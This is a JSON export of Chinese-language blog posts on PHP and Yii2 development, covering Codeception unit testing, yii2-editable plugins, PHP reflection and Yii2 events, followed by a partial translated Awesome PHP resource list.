shengxin"},{"title":"Codeception安装使用（一）","slug":"Codeception-first","date":"2018-01-22T13:50:00.000Z","updated":"2021-02-18T13:06:57.081Z","comments":true,"path":"2018/01/22/Codeception-first/","link":"","permalink":"https://war9.cn/2018/01/22/Codeception-first/","excerpt":"","text":"简介Codeception是PHP的现代全栈测试框架。 受BDD的启发，它为您提供了一种绝对新的编写验收、功能和单元测试的方式。 由PHPUnit提供支持。 尽管TDD（测试驱动开发）受到广泛普及，但一些PHP开发人员从来没有为他们的应用程序编写自动化测试，主要是因为他们认为它很难、慢或无聊。Codeception框架是为了实际测试而开发的。 它允许以单一、连贯的方式进行编写单元、功能、集成和验收测试。 它可以称为BDD（行为驱动开发）框架。 所有的Codeception测试都以描述性方式编写。 只要看着测试本体，您就可以清楚地了解正在测试的内容以及如何进行测试。 即使是具有许多断言的复杂测试也是用简单的PHP域特定语言（DSL）编写的。 Yii2下的Codeception单元测试 因为近期开发项目一直使用Yii2框架。因此本文将介绍Yii2下的codeception的使用。另外Codeception官方也提供了许多框架的文档。Yii2: http://codeception.com/for/yiiLaravel: http://codeception.com/for/laravelWordpress: http://codeception.com/for/wordpressSymfony: http://codeception.com/for/symfony 安装部署1composer require &quot;codeception/codeception&quot; --dev 我在安装的时候，发现Yii2已经集成了该插件，但是缺少”guzzlehttp/guzzle”依赖无法运行。于是我执行了。composer require guzzlehttp/guzzle ** 2018年1月23日 11:04:07更新一些遇到的坑：** 运行时可能会遇到各种神奇的错误，这个时候一定要注意你的PHP版本。如果是PHP7版本，记的wget http://codeception.com/codecept.phar 。 不然你将遇到各种类找到等奇奇怪怪的错误…PHP5版本wget http://codeception.com/php5/codecept.phar 因为文章时效性，具体准确链接以官方网站为准。 在测试时，如果是高级模板(yii2-advanced-template)，单元测试将区分不同的目录，在backend、frontend、common分别会有一个test文件夹，用于单元测试。 如果测试后台应用，就切换到backend目录，运行codecept run。如果想测试所有，则在项目根目录运行codecept run。 初始化 1codecept bootstrap 配置数据库 在上面我们说过，yii2的单元测试是区分目录的，数据库配置也是单独的。 在config目录下，会有一个test.php和test-local.php存放单元测试的配置信息。 我们需要将backend、frontend、common目录下的config目录分别配置。其配置和main里的配置类似 在进行单元测试的时候，最好使用单独的测试数据库，以免在进行单元测试的时候，某些操作将数据库清空。 运行 1codecept run 默认是没有codecept命令的，需要配置一下。windows在环境变量Path里加入 D:\\Path\\to\\project\\vendor\\codeception\\base 通过模板创建测试 generate:cept suite filename - Generates a sample Cept scenario generate:cest suite filename - Generates a sample Cest test generate:test suite filename - Generates a sample PHPUnit Test with Codeception hooks generate:phpunit suite filename - Generates a classic PHPUnit Test generate:suite suite actor - Generates a new suite with the given Actor class name generate:scenarios suite - Generates text files containing scenarios from tests generate:helper filename - Generates a sample Helper File generate:pageobject suite filename - Generates a sample Page object generate:stepobject suite filename - Generates a sample Step object generate:environment env - Generates a sample Environment configuration generate:groupobject group - Generates a sample Group Extension PS：本来对这些英文进行了翻译，但是怕翻译不准确，这里还是看英文比较舒服。 对自己写的Helper函数进行测试 首先创建单元测试模板。1codecept g:test unit \\libraries\\\\DataHelper 编写测试方法123456789101112131415public function testRemoveSpace() &#123; $arr = [ &#x27;半角空格&#x27;=&gt;[&#x27;123&#x27;=&gt;&#x27; 123 &#x27;,&#x27;你好&#x27;=&gt;&#x27; 你好 &#x27;], &#x27;全角空格&#x27;=&gt;[&#x27;１２３&#x27;=&gt;&#x27; １２３ &#x27;,&#x27;你好&#x27;=&gt;&#x27; 你好 &#x27;], &#x27;Tab空格&#x27; =&gt;[&#x27;123&#x27;=&gt;&quot;\\t123\\t&quot;,&#x27;你好&#x27;=&gt;&quot;\\t你好\\t&quot;], &#x27;混合空格&#x27;=&gt;[&#x27;你好,123&#x27;=&gt;&quot;\\t 你好,123\\t &quot;], ]; foreach ($arr as $key =&gt; $list)&#123; foreach ($list as $k =&gt; $value)&#123; $result = DataHelper::removeSpace($value); expect(&#x27;函数存在遗漏:&#x27;.$key, $result == $k)-&gt;true(); &#125; &#125; &#125; 进行单元测试1codecept run 说明函数没有问题。我们来将函数故意写错，看一下是否可以报错。我们故意在半角空格处写错，发现可以报错。","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"},{"name":"Yii2","slug":"develop/Yii2","permalink":"https://war9.cn/categories/develop/Yii2/"}],"tags":[{"name":"单元测试","slug":"单元测试","permalink":"https://war9.cn/tags/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"name":"codeception","slug":"codeception","permalink":"https://war9.cn/tags/codeception/"},{"name":"PHPUnit","slug":"PHPUnit","permalink":"https://war9.cn/tags/PHPUnit/"},{"name":"Yii2","slug":"Yii2","permalink":"https://war9.cn/tags/Yii2/"}],"author":"Joe shengxin"},{"title":"Yii2-Editable插件【GridView编辑】","slug":"Yii2-Editable插件","date":"2018-01-16T16:46:00.000Z","updated":"2021-02-18T13:06:57.082Z","comments":true,"path":"2018/01/16/Yii2-Editable插件/","link":"","permalink":"https://war9.cn/2018/01/16/Yii2-Editable%E6%8F%92%E4%BB%B6/","excerpt":"","text":"项目过程中遇到一个这样的需求，想要在表格页面（GridView所在页）直接修改数据。在yiiframework.com进行一番探索，发现了yii2-editable插件。通过github搜索发现了N款yii2-editable插件。我们挑选综合排名前三个进行试用。 1.kartik-v/yii2-editable 项目github地址：https://github.com/kartik-v/yii2-editable 项目文档地址：http://demos.krajee.com/editable 开源协议：BSD-3-Clause license 优点 - Star最多 - 国内有教程介绍该插件（讲解不细） - 文档，演示比较完善 - 有两种样式，【按钮式，Link式】点击修改数据 - 数据形式多样【DatePicker、textarea、select等等】 缺点 - 依赖于其它项目：如果要在GridView上使用该插件，需安装kartik-v/yii2-grid。或者使用 123&#x27;value&#x27;=&gt;function($model)&#123; return \\kartik\\editable\\Editable::widget([]);&#125; 的形式。这种形式需要改写controller，要写的内容较多。 - 保存按钮很怪。保存按钮是一个下载图标。。 ** 具体使用介绍后续完善。**//TODO 2.yii2mod/yii2-editable 项目github地址：https://github.com/yii2mod/yii2-editable 项目文档地址：https://github.com/yii2mod/yii2-editable#yii2-editable-widget 开源协议：MIT license 优点 - 简单易用，使用简单方便1.在view层GirdView里需要的字段改写成如下代码。 12345[ &#39;class&#39;&#x3D;&gt;EditableColumn::class,&#x2F;&#x2F;Editable字段类 &#39;attribute&#39; &#x3D;&gt; &#39;name&#39;,&#x2F;&#x2F;字段名称 &#39;url&#39; &#x3D;&gt; [&#39;change-name&#39;],&#x2F;&#x2F;路由参数], 2.在Controller里actions方法里加入如下代码： 12345$actions&#x3D;parent::actions();$actions[&#39;change-name&#39;]&#x3D;[ &#39;class&#39; &#x3D;&gt; EditableAction::class,&#x2F;&#x2F;EditableAction类 &#39;modelClass&#39; &#x3D;&gt; User::class,&#x2F;&#x2F;数据model类 ]; 缺点 - 没完善的文档 3.2amigos/yii2-editable-widget 项目github地址：https://github.com/2amigos/yii2-editable-widget 项目文档地址：https://github.com/2amigos/yii2-editable-widget#x-editable-widget-for-yii2 开源协议：The BSD License (BSD). 优点 - 作者是团队 - 良好的单元测试提供 - 数据形式多样 缺点 - 没完善的文档 总结以上三款插件除官方推荐插件kartik-v/yii2-editable外，其余两个插件都是基于x-editable外部Jquery组件制作的。 因此kartik-v/yii2-editable的文档比较完善(PS.稍微有点乱，也可能是我看到一片一片的英文产生的感觉。。) 而其它两个插件的文档只能通过阅读X-Editable文档进行更多定制。 不过可以根据项目大小选择适合的项目 如果项目不是很大，这样的需求较弱，建议使用yii2mod/yii2-editable插件，因为其小巧精致，使用简单。如果项目已经完成，再改写起来，使用该插件较为方便。并且可以很方便的在GridView上改写使用。 如果该需求较强，建议使用kartik-v和2amigos的项目。这俩项目在单独的插件形式使用上，功能比较多。 这三款插件都是Yii2插件常见的贡献者。尤其是kartik-v和2amigos团队。感谢他们对Yii2作出的贡献。","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"},{"name":"Yii2","slug":"develop/Yii2","permalink":"https://war9.cn/categories/develop/Yii2/"}],"tags":[{"name":"Yii2","slug":"Yii2","permalink":"https://war9.cn/tags/Yii2/"},{"name":"yii2-editable","slug":"yii2-editable","permalink":"https://war9.cn/tags/yii2-editable/"}],"author":"Joe shengxin"},{"title":"PHP反射机制","slug":"PHPReflection","date":"2018-01-15T10:38:00.000Z","updated":"2021-02-18T13:06:57.082Z","comments":true,"path":"2018/01/15/PHPReflection/","link":"","permalink":"https://war9.cn/2018/01/15/PHPReflection/","excerpt":"","text":"简介在PHP5以后，加入了一个反射（Reflection）类，使用此类可以方便的获取某类的属性、常量、方法等。基本涵盖了想要获取类的所有信息。也可以扩展自身类，为使用类的人提供更多信息，而不必阅读源代码。 可以使用的场景非常多，比如自动生成文档，自动化插件等。 常用方法 获取常量列表 获取方法列表 获取属性列表 由于使用比较简单，其它请参考官方文档。完整的方法列表请点击查看 我们定义一个学生类，代码如下： 12345678910111213141516171819202122232425262728&lt;?phpclass Student&#123;const SCHOOL = &#x27;BeiJing Primary School&#x27;;const OBLIGATORY_COURSE = &#x27;CHINESE&#x27;;public $name;public $sex;public $id; public function getName()&#123; return $this-&gt;name; &#125; public function getSex()&#123; return $this-&gt;sex; &#125; public function getId()&#123; return $this-&gt;id; &#125; public function setName($name)&#123; $this-&gt;name = $name; &#125; public function setSex($sex)&#123; $this-&gt;sex = $sex; &#125; public function setId($id)&#123; $this-&gt;id = $id; &#125;&#125;?&gt; 首先new一个反射类，里面参数写上你想获取类的类名。 12$objectClass = new \\ReflectionClass(&#x27;Student&#x27;);//$objectClass-&gt;[方法] 获取常量列表 =&gt; public array getConstants ( void ) 12$constArray &#x3D; $objectClass-&gt;getConstants();var_dump($constArray); 将打印如下结果: 123456array(2) &#123;[&quot;SCHOOL&quot;]&#x3D;&gt;string(22) &quot;BeiJing Primary School&quot;[&quot;OBLIGATORY_COURSE&quot;]&#x3D;&gt;string(7) &quot;CHINESE&quot;&#125; 获取方法列表 =&gt; public array ReflectionClass::getMethods ([ int $filter ] )参数filter，对方法列表进行过滤，默认不过滤。 可使用提供的常量进行过滤 - ReflectionMethod::IS_STATIC ReflectionMethod::IS_PUBLIC ReflectionMethod::IS_PROTECTED ReflectionMethod::IS_PRIVATE ReflectionMethod::IS_ABSTRACT ReflectionMethod::IS_FINAL12$methodArray &#x3D; $objectClass-&gt;getMethods();var_dump($methodArray); 将打印如下结果:1234567891011121314151617181920212223242526272829303132333435363738394041424344 array(6) &#123; [0]&#x3D;&gt; object(ReflectionMethod)#2 (2) &#123; [&quot;name&quot;]&#x3D;&gt; string(7) &quot;getName&quot; [&quot;class&quot;]&#x3D;&gt; string(7) &quot;Student&quot; &#125; [1]&#x3D;&gt; object(ReflectionMethod)#3 (2) &#123; [&quot;name&quot;]&#x3D;&gt; string(6) &quot;getSex&quot; [&quot;class&quot;]&#x3D;&gt; string(7) &quot;Student&quot; &#125; [2]&#x3D;&gt; object(ReflectionMethod)#4 (2) &#123; [&quot;name&quot;]&#x3D;&gt; string(5) &quot;getId&quot; [&quot;class&quot;]&#x3D;&gt; string(7) &quot;Student&quot; &#125; [3]&#x3D;&gt; object(ReflectionMethod)#5 (2) &#123; [&quot;name&quot;]&#x3D;&gt; string(7) &quot;setName&quot; [&quot;class&quot;]&#x3D;&gt; string(7) &quot;Student&quot; &#125; [4]&#x3D;&gt; object(ReflectionMethod)#6 (2) &#123; [&quot;name&quot;]&#x3D;&gt; string(6) &quot;setSex&quot; [&quot;class&quot;]&#x3D;&gt; string(7) &quot;Student&quot; &#125; [5]&#x3D;&gt; object(ReflectionMethod)#7 (2) &#123; [&quot;name&quot;]&#x3D;&gt; string(5) &quot;setId&quot; [&quot;class&quot;]&#x3D;&gt; string(7) &quot;Student&quot; &#125;&#125; 获取属性列表 =&gt; public array ReflectionClass::getProperties ([ int $filter ] ) 参数filter用于过滤结果，可用常量如下： ReflectionProperty::IS_STATIC指示了 static 的属性。 ReflectionProperty::IS_PUBLIC指示了 public 的属性。 ReflectionProperty::IS_PROTECTED指示了 protected 的属性。 ReflectionProperty::IS_PRIVATE指示了 private 的属性。 12$propertyArray &#x3D; $objectClass-&gt;getProperties();var_dump($propertyArray); 将打印如下结果: 1234567891011121314151617181920212223array(3) &#123; [0]&#x3D;&gt; object(ReflectionProperty)#2 (2) &#123; [&quot;name&quot;]&#x3D;&gt; string(4) &quot;name&quot; [&quot;class&quot;]&#x3D;&gt; string(7) &quot;Student&quot; &#125; [1]&#x3D;&gt; object(ReflectionProperty)#3 (2) &#123; [&quot;name&quot;]&#x3D;&gt; string(3) &quot;sex&quot; [&quot;class&quot;]&#x3D;&gt; string(7) &quot;Student&quot; &#125; [2]&#x3D;&gt; object(ReflectionProperty)#4 (2) &#123; [&quot;name&quot;]&#x3D;&gt; string(2) &quot;id&quot; [&quot;class&quot;]&#x3D;&gt; string(7) &quot;Student&quot; &#125;&#125;","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://war9.cn/tags/PHP/"}],"author":"Joe shengxin"},{"title":"Yii2 Event事件-初识","slug":"Yii2-Event事件-初识","date":"2018-01-09T17:33:00.000Z","updated":"2021-02-18T13:06:57.082Z","comments":true,"path":"2018/01/09/Yii2-Event事件-初识/","link":"","permalink":"https://war9.cn/2018/01/09/Yii2-Event%E4%BA%8B%E4%BB%B6-%E5%88%9D%E8%AF%86/","excerpt":"","text":"yii2-事件 系列 第一篇 博主使用yii2时间不长,用于备忘分享，若有不正之处欢迎指正。十分感谢。本文仅用于快速使用yii2事件。后续文章将详细介绍yii2事件的更多细节。 前言最近在使用框架做项目中，多次使用到了Behavior。但是在使用的时候，切记不要盲目使用behavior，而是要区分场景。明白了场景到底需要什么的时候，再去选择使用事件(event)，还是行为(behavior)。 使用事件，可以在特定的时点，触发执行预先设定的一段代码，事件既是代码解耦的一种方式，也是设计业务流程的一种模式。现代软件中，事件无处不在，比如，你发了个微博，触发了一个事件，导致关注你的人，看到了你新发出来的内容。对于事件而言，有这么几个要素 [1]： yii2事件方法Event文件( \\yii\\base\\Event )函数模型： 12345678910111213141516171819202122232425262728293031323334class Event extends Object&#123; public $name; // 事件名 public $sender; // 事件发布者，通常是调用了 trigger() 的对象或类。 public $handled = false; // 是否终止事件的后续处理 public $data; // 事件相关数据 private static $_events = []; public static function on($class, $name, $handler, $data = null, $append = true) &#123; // ... ... // 用于绑定事件handler &#125; public static function off($class, $name, $handler = null) &#123; // ... ... // 用于取消事件handler绑定 &#125; public static function hasHandlers($class, $name) &#123; // ... ... // 用于判断是否有相应的handler与事件对应 &#125; public static function trigger($class, $name, $event = null) &#123; // ... ... // 用于触发事件 &#125;&#125; on =&gt;绑定事件handler 一个最简单的绑定: 123456789&lt;?php\\yii\\base\\Event::on( BaseActiveRecord::className(),//需要绑定的类名 BaseActiveRecord::EVENT_BEFORE_INSERT,//绑定插入前事件 function ($event)&#123;//事件handler。这里的$event即是上面类中的Event。 echo &#x27;I will insert a record into database&#x27;; //... &#125;); 以上例子表示将AR数据库插入之前事件，与自定义handler函数绑定。 off =&gt;解绑事件handler 一个最简单的解除绑定： 123456&lt;?php\\yii\\base\\Event::off( BaseActiveRecord::className(),//要接触绑定的类名 BaseActiveRecord::EVENT_AFTER_DELETE,//解除绑定的事件 //如果不写第三个参数，默认为null，将移除事件所有的handler。); 以上例子表示移除AR数据被删除后事件绑定的所有的handler.该函数将返回True或False表示是否找到并移除了该handler。 hasHandlers =&gt;判断这个类以及其父类的指定事件是否具有handler。 一个最简单的判断： 12345&lt;?php\\yii\\base\\Event::hasHandlers( BaseActiveRecord::className(),//要判断的类 BaseActiveRecord::EVENT_BEFORE_UPDATE//要判断的事件名称); 以上例子表示 判断AR类数据库记录变更行为下有没有handler。 ** 注：仔细阅读了源码后，发现该函数不仅会检查指定的这个类，也会检查其所有的父类。** offAll =&gt;解除所有类级别的事件处理程序。 一个最简单的解除所有绑定： 12&lt;?php\\yii\\base\\Event::offAll(); Yii2 内置事件在上面我们明白了如何绑定解绑事件，Yii2也很贴心的给我们提供了许多内置的事件，在这里列举一下，以用于快速查询。Tips:此内容可以在Yii2速查表里找到。 Application # 应用主体 应用处理请求before之前触发 Application::EVENT_BEFORE_REQUEST 应用处理请求before之后触发 Application::EVENT_AFTER_REQUEST Controller # 控制器 在每个Action运行之前触发 Controller::EVENT_BEFORE_ACTION 在每个Action运行之后触发 Controller::EVENT_AFTER_ACTION Model # 模型 在验证Model属性之前触发 Model::EVENT_BEFORE_VALIDATE 在验证Model属性之后触发 Model::EVENT_AFTER_VALIDATE Module # 模块 一个模块的Action运行前触发 Module::EVENT_BEFORE_ACTION 一个模块的Action运行后触发 Module::EVENT_AFTER_ACTION View # 视图 执行视图的beforePage时触发 View::EVENT_BEGIN_PAGE 执行视图的endPage函数时触发 View::EVENT_END_PAGE 在renderFile渲染一个视图文件之前触发 View::EVENT_BEFORE_RENDER 在renderFile渲染一个视图文件之后触发 View::EVENT_AFTER_RENDER 执行视图的beginBody函数时触发 View::EVENT_BEGIN_BODY 执行视图的endBody函数时触发 View::EVENT_END_BODY Widget # 挂件 Widget初始化时触发 Widget::EVENT_INIT Widget执行前触发 Widget::EVENT_BEFORE_RUN Widget执行之后触发 Widget::EVENT_AFTER_RUN ActiveQuery 由ActiveQuery的init函数触发 ActiveQuery::EVENT_INIT BaseActiveRecord &amp; ActiveRecord # 这也许是内置事件中最重要的一批了。 AR对象被初始化init时触发 BaseActiveRecord::EVENT_INIT AR执行查询结束时触发 BaseActiveRecord::EVENT_AFTER_FIND 插入结束时触发 BaseActiveRecord::EVENT_BEFORE_INSERT 插入之后触发 BaseActiveRecord::EVENT_AFTER_INSERT 更新记录之前触发 BaseActiveRecord::EVENT_BEFORE_UPDATE 更新记录之后触发 BaseActiveRecord::EVENT_AFTER_UPDATE 删除记录之前触发 BaseActiveRecord::EVENT_BEFORE_DELETE 删除记录之后触发 BaseActiveRecord::EVENT_AFTER_DELETE 在数据refresh成功之后触发 BaseActiveRecord::EVENT_AFTER_REFRESH Connection # 数据库连接 数据库连接被打开后触发 Connection::EVENT_AFTER_OPEN 事务被启动时触发 Connection::EVENT_BEGIN_TRANSACTION 事务被提交后触发 Connection::EVENT_COMMIT_TRANSACTION 事务回滚后触发 Connection::EVENT_ROLLBACK_TRANSACTION Response # Http响应 Response响应发送之前触发 Response::EVENT_BEFORE_SEND Response响应发送之后触发 Response::EVENT_AFTER_SEND Response响应内容准备好之后触发 Response::EVENT_AFTER_PREPARE User # 会员登陆授权 登陆之前触发 User::EVENT_BEFORE_LOGIN 登陆之后触发 User::EVENT_AFTER_LOGIN 注销之前触发 User::EVENT_BEFORE_LOGOUT 注销之后触发 User::EVENT_AFTER_LOGOUT 一些使用技巧使用事件不仅可以写到controller里面，实现这些用户注册成功触发SayHelloToUser事件这个场景。 也可以写到BootStrap文件中，实现一些比如全局安全检测，日志等功能。另外也可以写到配置文件中。下面简单介绍一下配置文件实现绑定事件handler的流程。 下面贴一个用户登录事件绑定的实现，代码实现了登录后修改最后登录时间。config/main.php 1234567891011&#x27;components&#x27; =&gt; [ &#x27;user&#x27; =&gt; [ &#x27;identityClass&#x27; =&gt; &#x27;common\\models\\User&#x27;, &#x27;enableAutoLogin&#x27; =&gt; true, &#x27;on afterLogin&#x27; =&gt; function($event)&#123; $user = $event-&gt;identity; $user-&gt;loginTime = time(); $user-&gt;save(); &#125; ],] 上面就是在配置文件中绑定事件handler的基本形式。大体模型如下： 12345678&#x27;components&#x27; =&gt; [ &#x27;自定义component&#x27;=&gt;[ &#x27;class&#x27;=&gt;&#x27;\\path\\自定义&#x27;, &#x27;on Event名称&#x27;=&gt; function($event)&#123; //handler内容 &#125; ],], 一些其它需要留意的地方 事件是在Component引入的，yii\\base\\Object是不支持事件的。使用时要从yii\\base\\Component进行继承 Handler的形式必须是函数形式的。 文中部分内容引用自：[1]深入理解Yii2.0-事件","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"},{"name":"Yii2","slug":"develop/Yii2","permalink":"https://war9.cn/categories/develop/Yii2/"}],"tags":[{"name":"Yii2","slug":"Yii2","permalink":"https://war9.cn/tags/Yii2/"},{"name":"yii2-event","slug":"yii2-event","permalink":"https://war9.cn/tags/yii2-event/"},{"name":"yii2事件","slug":"yii2事件","permalink":"https://war9.cn/tags/yii2%E4%BA%8B%E4%BB%B6/"}],"author":"Joe shengxin"},{"title":"Yii2 资源大全","slug":"Yii2-resources","date":"2018-01-08T15:15:00.000Z","updated":"2021-02-18T13:06:57.082Z","comments":true,"path":"2018/01/08/Yii2-resources/","link":"","permalink":"https://war9.cn/2018/01/08/Yii2-resources/","excerpt":"","text":"Yii2资源大全 本文将记录一些常用的Yii2 资源，比如教程，好的开源项目，工具等.另外一个好的项目 awesome-yii本文将不断更新,如有更好的资源，欢迎提出意见！ 工具 Yii2 速查表 学习笔记 - Yii2 初学者笔记 工具 Yii2 速查表 Link:http://nai8.me/tool-sc.html Description: - 可以快速查询以下知识： - Composer - DAO - Logging - Validator - String - Session&amp;Cookie - Request - Response - Controller - ActiveForm - FileHelper - UploadedFile - Html - Alias - Query - Builder - Migrate - Asset - Management - Event - Route&amp;UrlManager - RESTful 学习笔记 - Yii2 初学者笔记 Link:http://blog.csdn.net/qq704005406/article/details/78075396 Description:这是我之前的博客写的日志，在初学Yii2的时候记的笔记，里面内容可能不严谨，适用于快速上手Yii2.","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"},{"name":"Yii2","slug":"develop/Yii2","permalink":"https://war9.cn/categories/develop/Yii2/"}],"tags":[{"name":"Yii2","slug":"Yii2","permalink":"https://war9.cn/tags/Yii2/"},{"name":"Yii2教程","slug":"Yii2教程","permalink":"https://war9.cn/tags/Yii2%E6%95%99%E7%A8%8B/"},{"name":"Yii2工具","slug":"Yii2工具","permalink":"https://war9.cn/tags/Yii2%E5%B7%A5%E5%85%B7/"},{"name":"学习资料","slug":"学习资料","permalink":"https://war9.cn/tags/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"}],"author":"Joe shengxin"},{"title":"【[转]PHP资源大全】Awesome PHP 项目","slug":"awesomePHP","date":"2018-01-03T16:54:00.000Z","updated":"2021-02-18T13:06:57.082Z","comments":true,"path":"2018/01/03/awesomePHP/","link":"","permalink":"https://war9.cn/2018/01/03/awesomePHP/","excerpt":"","text":"项目地址:https://github.com/ziadoz/awesome-php Awesome PHPA curated list of amazingly awesome PHP libraries, resources and shiny things. Contributing and CollaboratingPlease see CONTRIBUTING, CODE-OF-CONDUCT and COLLABORATING for details. Table of Contents Awesome PHP - Composer Packeg仓库 - 依赖关系管理 - 额外的依赖关系管理 - 框架 - 额外的框架 - 组件 - 微型框架 - 额外的微型框架 - 路由 - 模板 - 静态站点生成 HTTP - 中间件 URL Email Files Streams - 依赖注入 Imagery - 测试 - 持续集成 Documentation - 安全 - 密码学 - 代码分析 - 代码质量 - 静态分析 Architectural - 调试性能分析 - 构建工具 Task Runners - 导航 - 资源管理 - 地理位置 - 日期时间 - 事件 - 日志 - 电子商务 PDF Office Database - 数据库迁移 NoSQL - Queue队列 Search - 命令行 - 身份验证和授权 Markup Strings Numbers - 过滤和验证 API - 缓存 - 数据结构和存储 - 通知 - 部署 - 国际化和本地化 - 第三方API - 扩展 - 杂项 软件资源 - PHP安装 - 开发环境 - 虚拟机 - 文本编辑器和IDE - Web应用 Infrastructure Resources - PHP站点 - 其它站点 - PHP 书籍 - PHP 视频 - PHP 博客 - PHP 阅读 - PHP 内部阅读 贡献名单 Composer RepositoriesComposer Repositories. Firegento - Magento Module Composer Repository. Packagist - The PHP Package Repository. PaketHub - All-in-One PHP Package Repository. Private Packagist - Composer package archive as a service for PHP. WordPress Packagist - Manage your plugins with Composer. Zend Framework Packages - Zend Framework Composer Repository. Dependency ManagementLibraries for dependency and package management. Composer Installers - A multi framework Composer library installer. Composer - A package and dependency manager. Melody - A tool to build one file Composer scripts. Pickle - A PHP extension installer. Dependency Management ExtrasExtras related to dependency management. Composed - A library to parse your project’s Composer environment at runtime. Composer Checker - A tool to validate Composer configurations. Composer Merge Plugin - A composer plugin to merge several composer.json files. Composition - A library to check your Composer environment at runtime. NameSpacer - A library to convert from underscores to namespaces. Patch Installer - A library to install patches using Composer. Prestissimo - A composer plugin which enables parallel install process. Satis - A static Composer repository generator. tooly - A library to manage PHAR files in project using Composer. Toran Proxy - A static Composer repository and proxy. FrameworksWeb development frameworks. Aura Framework - A framework built from independent components. CakePHP - A rapid application development framework (CP). Laravel 5 - Another PHP framework (L5). Nette - Another framework comprised of individual components. Phalcon - A framework implemented as a C extension. PPI Framework 2 - An interoperability framework. Symfony - A framework comprised of individual components (SF). Yii2 - Another PHP framework. Zend Framework 2 - Another framework comprised of individual components (ZF2). Ice - Another simple and fast PHP framework delivered as C-extension. Framework ExtrasExtras related to web development frameworks. CakePHP CRUD - A Rapid Application Development (RAD) plugin for CakePHP. Knp RAD Components - A set of Rapid Application Development (RAD) components for Symfony. Symfony CMF - A Content Management Framework to create custom CMS. ComponentsStandalone components from web development frameworks and development groups. Aura - Independent components, fully decoupled from each other and from any framework. CakePHP Plugins - A directory of CakePHP plugins. Hoa Project - Another package of PHP components. League of Extraordinary Packages - A PHP package development group. Symfony Components - The components that make Symfony. Zend Framework 2 Components - The components that make Zend Framework. Micro FrameworksMicro frameworks and routers. Bullet PHP - A micro framework for building REST APIs. Lumen - A micro-framework by Laravel. Proton - A StackPHP compatible micro framework. Radar - An Action-Domain-Responder implementation for PHP. Silex - A micro framework built around Symfony components. Slim - Another simple micro framework. Micro Framework ExtrasExtras related to micro frameworks and routers. Silex Skeleton - A project skeleton for Silex. Silex Web Profiler - A web debug toolbar for Silex. Slim Skeleton - A skeleton for Slim. Slim View - A collection of custom views for Slim. RoutersLibraries for handling application routing. Aura.Router - A full-featured routing library. Fast Route - A fast routing library. Klein - A flexible router. Pux - Another fast routing library. Route - A routing library built on top of Fast Route. TemplatingLibraries and tools for templating and lexing. Aura.View - Provides TemplateView and TwoStepView using PHP as the tempting language, with support for partials, sections, and helpers. Foil - Another native PHP templating library. Lex - A lightweight template parser. MtHaml - A PHP implementation of the HAML template language. Mustache - A PHP implementation of the Mustache template language. Phly Mustache - Another PHP implementation of the Mustache template language. PHPTAL - A PHP implementation of the TAL templating language. Plates - A native PHP templating library. Smarty - A template engine to complement PHP. Twig - A comprehensive templating language. Tale Jade - A PHP implementation of the Jade template language. Static Site GeneratorsTools for pre-processing content to generate web pages. Couscous - Couscous turns Markdown documentation into beautiful websites. It’s GitHub Pages on steroids. Phrozn - Another tool that converts Textile, Markdown and Twig into HTML. Sculpin - A tool that converts Markdown and Twig into static HTML. Spress - An extensible tool that converts Markdown and Twig into HTML. HTTPLibraries for working with HTTP. Buzz - Another HTTP client. Guzzle - A comprehensive HTTP client. HTTPFul - A chainable HTTP client. HTTPlug - An HTTP client abstraction without binding to a specific implementation. PHP VCR - A library for recording and replaying HTTP requests. Requests - A simple HTTP library. Retrofit - A library to ease creation of REST API clients. zend-diactoros - PSR-7 HTTP Message implementation. ScrapingLibraries for scraping websites. Embed - An information extractor from any web service or page. Goutte - A simple web scraper. PHP Spider - A configurable and extensible PHP web spider. MiddlewaresLibraries for building application using middlewares. Expressive - PSR-7 Middleware framework from Zend. PSR7-Middlewares - Inspiring collection of handy middlewares. Relay - A PHP 5.5 PSR-7 middleware dispatcher. Stack - A library of stackable middleware for Silex/Symfony. zend-stratigility - Middleware for PHP built on top of PSR-7. URLLibraries for parsing URLs. PHP Domain Parser - A domain suffix parser library. Purl - A URL manipulation library. sabre/uri - A functional URI manipulation library. Uri - Another URL manipulation library. EmailLibraries for sending and parsing email. CssToInlineStyles - A library to inline CSS in email templates. Email Reply Parser - An email reply parser library. Email Validator - A small email address validation library. Fetch - An IMAP library. Mautic - Email marketing automation PHPMailer - Another mailer solution. Stampie - A library for email services such as SendGrid, PostMark, MailGun and Mandrill. SwiftMailer - A mailer solution. FilesLibraries for file manipulation and MIME type detection. Apache MIME Types - A library that parses Apache MIME types. Canal - A library to determine internet media types. CSV - A CSV data manipulation library. Ferret - A MIME detection library. Flysystem - Another filesystem abstraction layer. Gaufrette - A filesystem abstraction layer. Hoa Mime - Another MIME detection library. Lurker - A resource tracking library. PHP FFmpeg - A wrapper for the FFmpeg video library. UnifiedArchive - A unified reader and writer of compressed archives. StreamsLibraries for working with streams. Streamer - A simple object-orientated stream wrapper library. Dependency InjectionLibraries that implement the dependency injection design pattern. Aura.Di - A serializable dependency injection container with constructor and setter injection, interface and trait awareness, configuration inheritance, and much more. Acclimate - A common interface to dependency injection containers and service locators. Auryn - A recursive dependency injector. Container - Another flexible dependency injection container. Disco - A PSR-11 compatible, annotation-based dependency injection container. PHP-DI - A dependency injection container that supports autowiring. Pimple - A tiny dependency injection container. Symfony DI - A dependency injection container component (SF). ImageryLibraries for manipulating images. Color Extractor - A library for extracting colours from images. GIF Creator - A library to create GIF animations from multiple images. GIF Frame Extractor - A library to extract GIF animation frame information. Glide - An on-demand image manipulation library. Image Hash - A library for generating perceptual image hashes. Image Optimizer - A library for optimizing images. Image With Text - A library for embedding text into images. Imagine - An image manipulation library. Intervention Image - Another image manipulation library. PHP Image Workshop - Another image manipulation library. TestingLibraries for testing codebases and generating test data. Alice - An expressive fixture generation library. AspectMock - A mocking framework for PHPUnit/Codeception. Atoum - A simple testing library. Behat - A behaviour driven development (BDD) testing framework. Codeception - A full stack testing framework. DBUnit - A database testing library for PHPUnit. Faker - A fake data generator library. HTTP Mock - A library for mocking HTTP requests in unit tests. Kahlan - Full stack Unit/BDD 